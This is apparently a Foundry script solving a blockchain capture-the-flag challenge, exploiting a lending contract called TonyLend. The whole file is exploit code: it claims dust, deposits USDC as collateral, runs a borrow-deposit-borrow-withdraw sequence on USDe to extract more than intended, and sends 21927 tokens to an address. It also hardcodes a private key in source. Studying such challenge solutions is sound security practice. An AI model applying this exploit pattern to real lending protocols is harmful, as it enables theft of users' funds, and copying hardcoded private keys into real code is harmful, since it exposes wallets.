// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "src/Challenge.sol";


contract Solution is Script {


    function run() external {
        uint256 privateKey = 0x553d028ccc619d420f0db7753fe19ac142e1c49dff4a5ee03363266adc4de058;
        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(0x72998f0cffFe9Bf0fC7465188aCF3c5a8C77B616);

        ERC20 usde = challenge.usde();
        ERC20 usdc = challenge.usdc();

        TonyLend tonyLend = challenge.tonyLend();

        challenge.claimDust();

        usdc.approve(address(tonyLend), 10000000e18);
        usde.approve(address(tonyLend), 10000000e18);
        
        tonyLend.deposit(1, usdc.balanceOf(vm.addr(privateKey)));

        tonyLend.borrow(0, 10_000e18);

        tonyLend.deposit(0, 10_000e18);

        tonyLend.borrow(0, 10_000e18);

        tonyLend.withdraw(0, 10_000e18);

        usde.transfer(address(0xc0ffee), 21927 ether);

        vm.stopBroadcast();
    }


}